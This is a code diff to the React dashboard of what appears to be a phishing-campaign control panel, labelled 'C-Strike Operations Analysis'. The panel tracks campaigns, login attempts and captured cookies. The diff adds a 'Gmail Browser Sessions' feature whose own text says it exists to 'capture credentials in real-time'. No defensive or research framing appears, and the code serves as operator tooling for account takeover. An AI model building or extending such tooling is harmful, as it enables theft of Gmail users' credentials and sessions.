@@ -16,6 +16,7 @@ import { fetchCampaigns } from "../services/apiService";
 import CampaignStatistics from "../components/Charts/CampaignStatistics";
 import LoginAttemptsList from "../components/LoginAttempts/LoginAttemptsList";
 import CookiesListener from "../components/CookieListener";
+import GmailBrowserControl from "../components/GmailBrowserControl";
 
 // Register Chart.js components and plugins
 ChartJS.register(
@@ -93,6 +94,7 @@ const Dashboard = () => {
   const [campaignStats, setCampaignStats] = useState(null);
   const [lastUpdated, setLastUpdated] = useState(new Date());
   const [autoRefresh, setAutoRefresh] = useState(true);
+  const [gmailSessions, setGmailSessions] = useState([]);
   const refreshTimerRef = useRef(null);
   const REFRESH_INTERVAL = 30000; // 30 seconds
 
@@ -106,6 +108,7 @@ const Dashboard = () => {
         loadCampaigns();
         if (selectedCampaign) {
           fetchCampaignStats(selectedCampaign.id);
+          checkGmailSessions();
         }
         setLastUpdated(new Date());
       }, REFRESH_INTERVAL);
@@ -123,6 +126,7 @@ const Dashboard = () => {
   useEffect(() => {
     if (selectedCampaign) {
       fetchCampaignStats(selectedCampaign.id);
+      checkGmailSessions();
     }
   }, [selectedCampaign]);
 
@@ -146,6 +150,45 @@ const Dashboard = () => {
       console.error("Error fetching campaigns:", error);
     } finally {
       setLoading(false);
+    }
+  };
+
+  // Function to check for Gmail browser sessions
+  const checkGmailSessions = async () => {
+    if (!selectedCampaign) return;
+    
+    try {
+      const response = await httpClient.get('/api/gmail-browser/sessions');
+      // Filter sessions for the selected campaign
+      const campaignSessions = response.data.sessions.filter(
+        session => session.campaignId === selectedCampaign.id
+      );
+      setGmailSessions(campaignSessions);
+    } catch (error) {
+      console.error("Error fetching Gmail sessions:", error);
+      setGmailSessions([]);
+    }
+  };
+
+  // Function to create a new Gmail browser session
+  const createGmailSession = async () => {
+    if (!selectedCampaign) return;
+    
+    try {
+      // Generate a simple session token (in production, this should be done server-side)
+      const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
+      const response = await httpClient.post('/api/gmail-browser/create-session', {
+        sessionToken,
+        campaignId: selectedCampaign.id
+      });
+      
+      if (response.data.success) {
+        // Refresh the sessions list
+        checkGmailSessions();
+        console.log('Gmail browser session created:', response.data.session);
+      }
+    } catch (error) {
+      console.error("Error creating Gmail session:", error);
     }
   };
 
@@ -245,7 +288,7 @@ const Dashboard = () => {
             <div className="space-y-2">
               <div className="flex items-center space-x-4">
                 <h1 className="text-4xl font-bold text-cyber-primary tracking-tight">
-                  F-Strike Operations Analysis
+                  C-Strike Operations Analysis
                 </h1>
               </div>
               <p className="text-cyber-muted">
@@ -255,16 +298,6 @@ const Dashboard = () => {
             
             {/* Control Panel */}
             <div className="flex items-center space-x-4">
-              {/* System Status */}
-              <div className="glass-card px-4 py-2">
-                <div className="flex items-center space-x-2 text-sm">
-                  <div className="w-2 h-2 bg-green-400 rounded-full status-indicator"></div>
-                  <span className="text-cyber-muted">System Operational</span>
-                  <span className="text-xs text-cyber-primary ml-2">
-                    {new Date().toLocaleTimeString()}
-                  </span>
-                </div>
-              </div>
               
               {/* Auto-refresh Toggle */}
               <div className="glass-card px-4 py-3">
@@ -281,6 +314,7 @@ const Dashboard = () => {
                       loadCampaigns();
                       if (selectedCampaign) {
                         fetchCampaignStats(selectedCampaign.id);
+                        checkGmailSessions();
                       }
                       setLastUpdated(new Date());
                     }}
@@ -368,6 +402,65 @@ const Dashboard = () => {
                       </h3>
                     </div>
                     <LoginAttemptsList campaignId={selectedCampaign.id} />
+                  </div>
+
+                  {/* Gmail Browser Sessions */}
+                  <div className="glass-card p-8">
+                    <div className="flex items-center justify-between mb-6">
+                      <div className="flex items-center space-x-3">
+                        <svg className="w-6 h-6 text-cyber-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                        </svg>
+                        <h3 className="text-xl font-semibold text-cyber-primary">
+                          Gmail Browser Sessions
+                        </h3>
+                        {gmailSessions.length > 0 && (
+                          <div className="badge badge-warning">
+                            {gmailSessions.length} Active
+                          </div>
+                        )}
+                      </div>
+                      
+                      <button
+                        onClick={createGmailSession}
+                        className="glass-button px-4 py-2 rounded-lg flex items-center space-x-2 bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
+                      >
+                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
+                        </svg>
+                        <span>Create Session</span>
+                      </button>
+                    </div>
+                    
+                    {gmailSessions.length > 0 ? (
+                      <div className="space-y-4">
+                        {gmailSessions.map((session) => (
+                          <GmailBrowserControl 
+                            key={session.sessionToken}
+                            session={session}
+                            campaignId={selectedCampaign.id}
+                          />
+                        ))}
+                      </div>
+                    ) : (
+                      <div className="text-center py-8">
+                        <svg className="w-16 h-16 text-cyber-muted mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                        </svg>
+                        <h4 className="text-lg font-semibold text-cyber-primary mb-2">
+                          No Gmail Browser Sessions
+                        </h4>
+                        <p className="text-cyber-muted mb-4">
+                          Create a Gmail browser session to capture credentials in real-time
+                        </p>
+                        <button
+                          onClick={createGmailSession}
+                          className="glass-button px-6 py-3 rounded-lg bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
+                        >
+                          Create Gmail Session
+                        </button>
+                      </div>
+                    )}
                   </div>
                 </>
               ) : (
